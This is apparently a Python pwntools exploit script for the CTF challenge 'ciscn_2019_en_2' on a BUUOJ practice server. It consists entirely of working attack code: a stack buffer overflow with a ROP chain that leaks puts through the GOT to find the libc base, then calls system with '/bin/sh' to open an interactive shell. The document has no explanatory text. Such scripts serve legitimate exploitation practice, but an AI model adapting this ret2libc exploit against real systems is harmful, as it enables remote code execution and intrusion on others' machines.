from pwn import *

context.log_level = 'debug'
elf = ELF('ciscn_2019_en_2')
# io = process('ciscn_2019_en_2')
io = remote('node4.buuoj.cn', 26307)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('libc-2.27.so')
pop_rdi_ret = 0x400c83
ret = 0x4006b9
main_addr = elf.symbols['main']
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']

io.sendlineafter('Input your choice!\n', '1')
payload = cyclic(0x58) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr) 
io.sendlineafter('Input your Plaintext to be encrypted\n', payload)
io.recvline()
io.recvline()
libc_base = u64(io.recvn(6).ljust(8, b'\x00')) - libc.symbols['puts']
log.success('libc_base: ' + hex(libc_base))

system_addr = libc_base + libc.symbols['system']
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh\x00'))
io.sendlineafter('Input your choice!\n', '1')
payload = cyclic(0x58) + p64(0x4006b9) + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr)
io.sendlineafter('Input your Plaintext to be encrypted\n', payload)
io.interactive()

